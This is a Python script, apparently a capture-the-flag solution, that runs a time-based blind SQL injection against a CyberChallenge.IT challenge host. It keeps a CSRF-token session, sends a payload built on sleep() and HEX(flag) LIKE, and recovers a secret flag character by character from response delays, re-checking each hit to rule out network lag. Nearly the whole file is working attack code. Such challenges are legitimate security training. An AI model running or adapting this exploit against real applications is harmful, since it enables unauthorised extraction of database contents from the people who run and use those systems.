import requests
import time


class Inj:
    def __init__(self, host):
        self.sess = requests.Session()
        self.base_url = f'{host.rstrip("/")}/api/'
        self._refresh_csrf_token()

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token').json()
        self.token = resp['token']

    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query}
        return self.sess.post(url, json=data, headers=headers, timeout=5).json()

    def time(self, query):
        url = self.base_url + 'time'
        try:
            self._do_raw_req(url, query)
        except requests.exceptions.ReadTimeout:
            pass


host = 'http://sqlinjection.challs.cyberchallenge.it'
print(f"[*] Connecting to {host} ...")
try:
    inj = Inj(host)
except Exception as e:
    print(f"[-] Network error at startup: {e}")
    exit(1)

dictionary = '0123456789abcdef'
result = ''
payload = "1' and (select sleep(1) from flags where HEX(flag) LIKE '{}%')='1"

print("[*] Starting time-based attack with false-positive verification...")

while True:
    found = False
    for c in dictionary:
        question = payload.format(result + c)
        print(f"[*] Testing: {result + c} | ", end='', flush=True)
        start = time.time()
        inj.time(question)
        elapsed = time.time() - start
        print(f"Time: {elapsed:.2f}s", end='\r')
        if elapsed > 0.95:
            print(f"\n[?] Suspected match on '{c}'. Verifying to rule out lag...", end='\r')
            time.sleep(0.2)
            start_verify = time.time()
            inj.time(question)
            elapsed_verify = time.time() - start_verify
            if elapsed_verify > 0.95:
                result += c
                print(f"\n[+] CONFIRMED: '{c}' -> HEX: {result} (times: {elapsed:.2f}s, {elapsed_verify:.2f}s)")
                found = True
                break
            else:
                print(f"\n[-] False positive discarded on '{c}' (verify: {elapsed_verify:.2f}s). Continuing...")
        time.sleep(0.1)
    if not found:
        print("\n\n[-] No match found. Extraction finished or upstream error.")
        break

print(f"\n[*] HEX extraction finished: {result}")

if result:
    try:
        flag = bytes.fromhex(result).decode('utf-8')
        print("=" * 50)
        print(f"[!] FLAG: {flag}")
        print("=" * 50)
    except Exception as e:
        print(f"[-] ASCII conversion error: {e}")